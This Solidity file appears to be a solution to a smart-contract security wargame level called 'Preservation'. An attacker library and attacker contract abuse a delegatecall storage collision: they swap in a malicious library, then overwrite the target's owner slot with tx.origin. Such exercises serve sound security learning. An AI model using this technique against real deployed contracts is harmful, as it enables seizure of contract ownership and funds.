// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./16-Preservation.sol";

contract PreservationAttackerLibrary {
    address public first;
    address public second;
    address public myOwnAddress;

    function setTime(uint256 _time) public {
        /*We want to switch this library with
        orginal library. Then this function will
        change the value of the third variable in
        hacked contract. */
        myOwnAddress = tx.origin;
    }
}

contract PreservationAttacker {
    Preservation public preservation;
    PreservationAttackerLibrary public preservationAttackerLibrary;

    constructor(address _preservationAddress, address _preservationAttackerLibraryAddress) public {
        preservation = Preservation(_preservationAddress);
        preservationAttackerLibrary = PreservationAttackerLibrary(
            _preservationAttackerLibraryAddress
        );
    }

    function attack() public {
        /*Change defaut library with our. */
        preservation.setFirstTime(uint256(address(preservationAttackerLibrary)));

        /*Call our function inside our library */
        preservation.setFirstTime(2);
    }
}
